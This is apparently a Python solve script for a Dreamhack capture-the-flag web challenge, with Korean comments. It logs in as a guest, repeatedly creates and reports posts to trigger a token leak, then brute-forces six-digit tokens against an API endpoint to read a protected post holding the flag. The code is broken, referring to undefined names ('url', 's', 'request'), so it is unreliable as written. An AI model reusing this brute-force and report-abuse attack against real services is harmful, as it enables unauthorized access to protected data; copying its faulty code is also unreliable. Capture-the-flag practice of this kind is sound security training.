from requests import Session
from tqdm import tqdm
from time import sleep

# 기본 세팅
BASE_URL = 'http://host3.dreamhack.games:20049/'
headers = {'Content-Type': 'application/x-www-form-urlencoded'}

login_data = {
	'username':'guest',
	'password':'guest'
}

create_data = {
	'title':'guest',
	'content':'guest'
}

report_data = {
	'report_reason':'guest'
}

session = Session()

# 로그인 guest
session.post(f'{BASE_URL}auth/login', headers=headers, data=login_data)

# create & report
token_leak_cnt = 0
while token_leak_cnt < 1000:
    session.post(f'{BASE_URL}post/create', headers=headers, data=create_data)
    session.post(url+'post/report/5', headers=headers, data=report_data)
    while 'guest' in s.get(url+'post').text:
        session.post(url+'post/report/5', headers=headers, data=report_data)
        token_leak_cnt += 1
        print(token_leak_cnt, end=' ')


# token 무작위 대입 & flag 열람.
for i in range(0, 1000):
    token = ('000000'+str(i))[-6:]
    print(token, end=' ')
    try:
        o = request.post(f'{BASE_URL}api/post', headers=headers, data={'token':token, 'post_id':'2'}).json()
        if o['success']:
            print(o)
            break
    except:
        pass